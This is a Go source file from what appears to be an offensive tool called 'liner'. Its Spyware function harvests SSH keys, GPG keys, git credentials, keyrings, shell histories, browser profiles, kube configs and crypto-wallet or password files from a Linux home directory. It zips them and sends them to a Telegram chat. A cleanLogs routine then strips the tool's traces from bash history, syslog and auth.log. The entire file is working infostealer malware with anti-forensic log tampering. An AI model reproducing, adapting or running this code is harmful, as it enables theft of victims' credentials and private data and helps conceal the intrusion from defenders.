package core

import (
	"archive/zip"
	"bufio"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/Nowafen/liner/payloads"
)

// Spyware handles data extraction based on dump type
func Spyware(dumpType, token, chatID string, silent bool) error {
	// Detect OS
	osInfo, err := payloads.DetectOS()
	if err != nil {
		return fmt.Errorf("failed to detect OS: %v", err)
	}
	if !strings.Contains(osInfo, "Linux") {
		return fmt.Errorf("this payload only supports Linux systems")
	}

	// Create temp directory for data collection
	tempDir := "/tmp/liner_data"
	if err := os.MkdirAll(tempDir, 0755); err != nil {
		return fmt.Errorf("failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	// Collect data based on dump type
	var filesToCollect []string
	switch strings.ToLower(dumpType) {
	case "credentials":
		filesToCollect = append(filesToCollect, collectCredentials()...)
	case "password":
		filesToCollect = append(filesToCollect, collectPasswords()...)
	case "session":
		filesToCollect = append(filesToCollect, collectSessions()...)
	case "privatedata":
		filesToCollect = append(filesToCollect, collectPrivateData()...)
	case "all":
		filesToCollect = append(filesToCollect, collectCredentials()...)
		filesToCollect = append(filesToCollect, collectPasswords()...)
		filesToCollect = append(filesToCollect, collectSessions()...)
		filesToCollect = append(filesToCollect, collectPrivateData()...)
	default:
		return fmt.Errorf("invalid dump type: %s", dumpType)
	}

	// Zip collected files
	zipFile := "/tmp/liner_data.zip"
	if err := createZipFile(filesToCollect, zipFile); err != nil {
		return fmt.Errorf("failed to create zip file: %v", err)
	}

	// Send to Telegram
	if err := SendToTelegram(token, chatID, zipFile, silent); err != nil {
		return fmt.Errorf("failed to send data to Telegram: %v", err)
	}

	// Clean logs selectively
	if err := cleanLogs(); err != nil {
		return fmt.Errorf("failed to clean logs: %v", err)
	}

	return nil
}

// collectCredentials gathers credential-related files
func collectCredentials() []string {
	return []string{
		filepath.Join(os.Getenv("HOME"), ".git-credentials"),
		filepath.Join(os.Getenv("HOME"), ".config/keyring"),
	}
}

// collectPasswords gathers password-related files
func collectPasswords() []string {
	return []string{
		filepath.Join(os.Getenv("HOME"), ".bash_history"),
		filepath.Join(os.Getenv("HOME"), ".zsh_history"),
		filepath.Join(os.Getenv("HOME"), ".password-store"),
	}
}

// collectSessions gathers session-related files
func collectSessions() []string {
	return []string{
		filepath.Join(os.Getenv("HOME"), ".ssh"),
		filepath.Join(os.Getenv("HOME"), ".gnupg"),
		filepath.Join(os.Getenv("HOME"), ".kube/config"),
		filepath.Join(os.Getenv("HOME"), ".mozilla"),
		filepath.Join(os.Getenv("HOME"), ".config/chromium"),
	}
}

// collectPrivateData gathers sensitive private data files
func collectPrivateData() []string {
	var files []string
	// Existing patterns
	patterns := []string{"*.env", "*.p12", "*.pem", "*.kdbx", "*.keepass", "*.sqlite", "*.wallet"}
	for _, pattern := range patterns {
		matches, _ := filepath.Glob(filepath.Join(os.Getenv("HOME"), pattern))
		files = append(files, matches...)
	}

	// Deep crawl for files with specific keywords
	keywords := []string{"wallet.txt", "trustwallet.txt", "password", "apikey", "important"}
	filepath.Walk(os.Getenv("HOME"), func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // Ignore errors to continue crawling
		}
		if info.IsDir() {
			return nil // Skip directories
		}
		// Check file permissions
		if info.Mode().Perm()&0400 == 0 {
			return nil // Skip files without read permission
		}
		filename := strings.ToLower(filepath.Base(path))
		for _, keyword := range keywords {
			if strings.Contains(filename, keyword) {
				files = append(files, path)
			}
		}
		return nil
	})

	return files
}

// createZipFile zips the collected files
func createZipFile(files []string, output string) error {
	zipOut, err := os.Create(output)
	if err != nil {
		return err
	}
	defer zipOut.Close()

	writer := zip.NewWriter(zipOut)
	defer writer.Close()

	for _, file := range files {
		if _, err := os.Stat(file); os.IsNotExist(err) {
			continue
		}
		f, err := os.Open(file)
		if err != nil {
			continue
		}
		defer f.Close()

		w, err := writer.Create(filepath.Base(file))
		if err != nil {
			return err
		}
		_, err = io.Copy(w, f)
		if err != nil {
			return err
		}
	}
	return nil
}

// cleanLogs removes traces of the tool from system logs
func cleanLogs() error {
	logFiles := []string{
		filepath.Join(os.Getenv("HOME"), ".bash_history"),
		"/var/log/syslog",
		"/var/log/auth.log",
	}
	toolName := "liner"
	for _, log := range logFiles {
		if _, err := os.Stat(log); os.IsNotExist(err) {
			continue
		}
		// Read log file
		input, err := os.Open(log)
		if err != nil {
			continue
		}
		defer input.Close()

		// Create temp file
		tempFile, err := os.CreateTemp("", "liner_log_")
		if err != nil {
			continue
		}
		defer tempFile.Close()

		// Filter out lines containing toolName
		scanner := bufio.NewScanner(input)
		for scanner.Scan() {
			line := scanner.Text()
			if !strings.Contains(strings.ToLower(line), toolName) {
				fmt.Fprintln(tempFile, line)
			}
		}
		if err := scanner.Err(); err != nil {
			continue
		}

		// Replace original log file
		input.Close()
		tempFile.Close()
		if err := os.Rename(tempFile.Name(), log); err != nil {
			return fmt.Errorf("failed to replace log file %s: %v", log, err)
		}
	}

	// Clear journalctl logs if running as root
	if os.Geteuid() == 0 {
		cmd := exec.Command("journalctl", "--flush")
		if err := cmd.Run(); err != nil {
			return fmt.Errorf("failed to flush journalctl logs: %v", err)
		}
	}

	return nil
}
